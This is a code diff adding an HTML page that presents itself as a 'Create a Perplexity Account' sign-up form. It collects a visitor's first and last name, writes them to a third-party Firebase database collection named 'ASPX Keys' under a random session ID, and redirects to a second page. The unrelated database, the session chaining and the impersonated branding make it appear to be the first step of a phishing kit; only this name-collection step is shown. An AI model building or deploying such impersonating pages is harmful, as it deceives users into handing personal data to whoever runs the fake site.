@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account</title>
+    <style>
+        /* Change font to Arial */
+        * {
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            background-color: #ffffff;
+            color: #000000;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            margin-top: 40px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #6e6e80;
+            margin-bottom: 40px;
+        }
+
+        .input-group {
+            width: 100%;
+            position: relative;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-group label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: white;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #6e6e80;
+            z-index: 1;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid #d1d1d6;
+            border-radius: 24px; 
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        /* Focus color changed from green to black */
+        input:focus {
+            border-color: #000000;
+            border-width: 2px;
+        }
+
+        .btn-continue {
+            width: 100%;
+            background-color: #000000;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 28px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-continue:active {
+            opacity: 0.8;
+        }
+
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            margin-left: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Create a Perplexity Account</h1>
+    <p class="subtitle">Enter your name</p>
+
+    <div class="input-group">
+        <label>First name</label>
+        <input type="text" id="firstName" placeholder="First name" required autofocus>
+        <div id="fnError" class="error">First name is required</div>
+    </div>
+
+    <div class="input-group" style="margin-top: 10px;">
+        <label>Last name</label>
+        <input type="text" id="lastName" placeholder="Last name (optional)">
+    </div>
+
+    <button class="btn-continue" id="continueBtn">Continue</button>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+        authDomain: "question-metabase.firebaseapp.com",
+        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "question-metabase",
+        storageBucket: "question-metabase.firebasestorage.app",
+        messagingSenderId: "770698198753",
+        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+        measurementId: "G-6ZP1FPMKSJ"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    function initSession() {
+        const params = new URLSearchParams(window.location.search);
+        let session = params.get('session');
+        let type = params.get('type') || 'personal';
+
+        if (!session) {
+            session = Math.floor(1000000000 + Math.random() * 9000000000).toString();
+            const newUrl = `${window.location.pathname}?session=${session}&type=${type}`;
+            window.history.replaceState({}, '', newUrl);
+        }
+        return { session, type };
+    }
+
+    const { session, type } = initSession();
+
+    // The core function to save and redirect
+    async function submitData() {
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
+        const errorDiv = document.getElementById('fnError');
+
+        if (!firstName) {
+            errorDiv.style.display = 'block';
+            return;
+        }
+        errorDiv.style.display = 'none';
+
+        let familyValue = "no";
+        if (type === 'Kids') familyValue = "comit";
+        if (type === 'busniess') familyValue = "workspace";
+        if (type === 'personal') familyValue = "no";
+
+        try {
+            // Updated Collection Name to "ASPX Keys"
+            await setDoc(doc(db, "ASPX Keys", session), {
+                firstName: firstName,
+                lastName: lastName,
+                family: familyValue,
+                timestamp: new Date()
+            });
+
+            window.location.href = `2.html?session=${session}&type=${type}`;
+        } catch (e) {
+            console.error("Error: ", e);
+        }
+    }
+
+    // Logic: Enter key on First Name moves focus to Last Name
+    document.getElementById('firstName').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('lastName').focus();
+        }
+    });
+
+    // Logic: Enter key on Last Name submits the form
+    document.getElementById('lastName').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            submitData();
+        }
+    });
+
+    // Click logic
+    document.getElementById('continueBtn').addEventListener('click', submitData);
+</script>
+
+</body>
+</html>
